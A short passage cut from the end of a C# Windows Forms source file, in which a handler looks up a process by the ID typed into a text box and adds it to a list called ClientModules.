            ClientModules.Add(Process.GetProcessById(int.Parse(textBox6.Text.ToString())));
        }
    }
}